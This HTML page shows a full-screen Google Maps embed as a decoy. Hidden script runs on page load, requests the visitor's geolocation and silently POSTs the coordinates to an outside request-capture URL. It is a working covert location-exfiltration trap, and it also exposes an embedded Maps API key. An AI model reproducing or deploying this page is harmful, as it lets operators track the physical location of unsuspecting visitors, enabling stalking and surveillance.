<!DOCTYPE html>
<html>
<body>

<iframe frameborder="0" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;" src="https://www.google.com/maps/embed/v1/place?key=AIzaSyA0Dx_boXQiwvdz8sJHoYeZNVTdoWONYkU&amp;q=place_id:ChIJn6wOs6lZwokRLKy1iqRcoKw" allowfullscreen=""></iframe>

<script>

function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
    } else {
        post("no permissions");
    }
}

function showPosition(position) {
  post(position.coords.latitude + " " + position.coords.longitude)
}

function post(location)
{
  var http = new XMLHttpRequest();
  var url = "https://requestb.in/1hatz7d1";
  var params = location;
  http.open("POST", url, true);
  http.send(params);
}

getLocation();

</script>

</body>
</html>
